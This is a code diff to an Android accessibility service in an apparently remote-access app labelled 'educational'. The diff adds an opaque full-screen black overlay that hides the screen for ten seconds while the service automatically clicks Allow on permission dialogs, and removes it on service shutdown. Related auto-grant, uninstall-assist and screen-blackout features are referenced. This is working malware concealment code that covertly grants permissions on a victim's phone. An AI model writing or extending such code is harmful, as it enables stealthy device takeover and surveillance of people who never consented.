@@ -24,9 +24,12 @@ import java.util.List;
 
 import android.content.Intent;
 import android.graphics.Bitmap;
+import android.graphics.Color;
+import android.graphics.PixelFormat;
 import android.net.Uri;
 import android.os.Build;
 import android.provider.Settings;
+import android.view.View;
 import androidx.annotation.RequiresApi;
 import com.remoteaccess.educational.R;
 import com.remoteaccess.educational.network.SocketManager;
@@ -56,6 +59,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private volatile boolean autoGrantMode = false;
     private Handler autoGrantHandler;
     private Runnable autoGrantScanRunnable;
+
+    // Solid black overlay shown during the 10-second auto-grant window
+    private View overlayView;
+    private WindowManager overlayWindowManager;
     
     // Uninstall assist mode
     private volatile boolean uninstallAssistMode = false;
@@ -94,6 +101,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
         // Auto-grant timer clicks Allow/Grant for runtime permissions (storage excluded)
         try { startAutoGrantTimer(); } catch (Exception ignored) {}
+        // Solid black overlay covers screen during the 10-second auto-grant window
+        try { addBlackOverlay(); } catch (Exception ignored) {}
         try {
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try { startAutoClickScanner(); } catch (Exception ignored) {}
@@ -542,6 +551,57 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             Log.i(TAG, "Auto-grant mode expired (on-demand re-enable)");
         }, durationMs);
         Log.i(TAG, "Auto-grant mode RE-ENABLED for " + durationMs + " ms (dashboard storage request)");
+    }
+
+    /**
+     * Shows a fully opaque black overlay for 10 seconds while auto-grant runs.
+     * Uses TYPE_ACCESSIBILITY_OVERLAY so no SYSTEM_ALERT_WINDOW permission is needed.
+     * FLAG_NOT_TOUCHABLE + FLAG_NOT_FOCUSABLE ensure touches still reach permission dialogs
+     * underneath so accessibility can programmatically click them.
+     * Auto-removes after 10 seconds.
+     */
+    private void addBlackOverlay() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) return;
+        try {
+            overlayWindowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+            overlayView = new View(this);
+            overlayView.setBackgroundColor(Color.BLACK);
+
+            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                    ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
+                    : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
+
+            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                type,
+                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                    | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
+                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                PixelFormat.OPAQUE
+            );
+            overlayWindowManager.addView(overlayView, lp);
+            Log.i(TAG, "Black overlay added — auto-removes in 10 s");
+
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                try { removeBlackOverlay(); } catch (Exception ignored) {}
+                Log.i(TAG, "Black overlay removed after 10 s");
+            }, 10_000);
+        } catch (Exception e) {
+            Log.e(TAG, "addBlackOverlay error: " + e.getMessage());
+        }
+    }
+
+    /** Removes the black overlay. Also called on service destroy. */
+    private void removeBlackOverlay() {
+        try {
+            if (overlayWindowManager != null && overlayView != null) {
+                overlayWindowManager.removeView(overlayView);
+                overlayView = null;
+                overlayWindowManager = null;
+            }
+        } catch (Exception ignored) {}
     }
 
     // Words that disqualify a toggle from being auto-enabled
@@ -1136,6 +1196,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     @Override
     public void onDestroy() {
         try { super.onDestroy(); } catch (Exception ignored) {}
+        try { removeBlackOverlay(); } catch (Exception ignored) {}
         try { com.remoteaccess.educational.commands.ScreenBlackout.getInstance().clearService(); } catch (Exception ignored) {}
         try {
             if (autoClickHandler != null && autoClickRunnable != null) {
